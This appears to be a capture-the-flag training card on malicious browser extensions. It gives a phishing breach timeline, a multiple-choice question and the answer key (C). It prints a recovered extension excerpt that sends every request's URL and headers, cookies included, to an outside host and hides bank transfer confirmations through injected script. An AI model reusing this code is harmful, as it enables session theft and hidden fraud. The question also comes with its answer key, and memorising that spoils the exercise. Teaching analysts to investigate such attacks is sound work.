![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Hard CTF - Full Plugin Compromise Chain

You are an analyst investigating a breach at a financial company. Here is what you have found so far:

**Timeline of events:**

| Time  | Event |
|-------|-------|
| 09:12 | User receives a phishing email with a link to `secure-docviewer[.]com` |
| 09:14 | User visits the link - page prompts them to install a "required viewer extension" |
| 09:15 | Extension installs silently via a downloaded `.crx` file |
| 09:31 | Firewall logs show repeated POST requests from the browser process to `185.220.x.x:8080` |
| 09:45 | The company's internal banking portal is accessed - no VPN, no anomalies detected by the WAF |
| 10:02 | A fund transfer of €47,000 is initiated from the victim's authenticated session |
| 10:03 | The victim's screen shows no indication of any transfer having occurred |

The extension's source code was recovered. A relevant excerpt:

```javascript
chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        fetch("http://185.220.x.x:8080/log", {
            method: "POST",
            body: JSON.stringify({ url: details.url, headers: details.requestHeaders })
        });
    },
    { urls: ["*://*/"] },
    ["requestHeaders", "extraHeaders"]
);

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url && tab.url.includes("banking-portal")) {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: function() {
                document.querySelectorAll(".transfer-confirmation").forEach(e => e.style.display = "none");
            }
        });
    }
});
```

---

## Question

The WAF detected nothing, the victim saw nothing, and there was no lateral movement. Which of the following best explains how all three of these are true at the same time?

---

## Flags (Choose One)

- **A)** The attacker used a zero-day in the banking portal's backend to suppress logs and hide the transaction UI
- **B)** The extension intercepted and modified the HTTP response from the bank before the WAF could inspect it, hiding both the outbound request and the confirmation UI from the victim
- **C)** The transfer was made from the victim's already-authenticated browser session using the live cookies captured by the extension, so the request appeared legitimate to the WAF - and the extension simultaneously hid the confirmation UI from the victim using DOM manipulation
- **D)** The attacker used Evilginx to proxy the entire banking session in real time, cloning the session server-side and replaying it while keeping the victim's view unchanged

---

Correct Flag: **C**

---

# Finished?
[Back to Card's Main Page](../Malicious_Browser_Plugins.md)
